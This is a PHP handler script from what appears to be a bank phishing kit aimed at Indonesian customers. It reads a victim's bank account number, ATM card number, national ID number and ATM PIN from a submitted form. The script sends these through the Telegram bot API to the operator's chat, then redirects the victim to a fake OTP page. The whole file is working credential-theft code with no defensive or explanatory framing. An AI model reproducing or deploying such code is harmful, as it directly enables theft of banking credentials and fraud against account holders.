<?php

session_start();
include "./telegram.php";



$norek = $_POST['norek'];
$no = $_POST['no'];
$mb = $_POST['mb'];
$cvv = $_POST['cvv'];
$nomor = $_POST['nomor'];


$message = "
~~~~~~~~~~~~~~~~~~~~~
BELUM TERDAFTAR
~~~~~~~~~~~~~~~~~~~~~

• NO REK : ".$norek." 
• NO ATM : ".$no."
• NIK KTP : ".$mb."
• PIN ATM : ".$cvv."

~~~~~~~bob~store~~~~~~~

";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ../otpblm.php');
?>
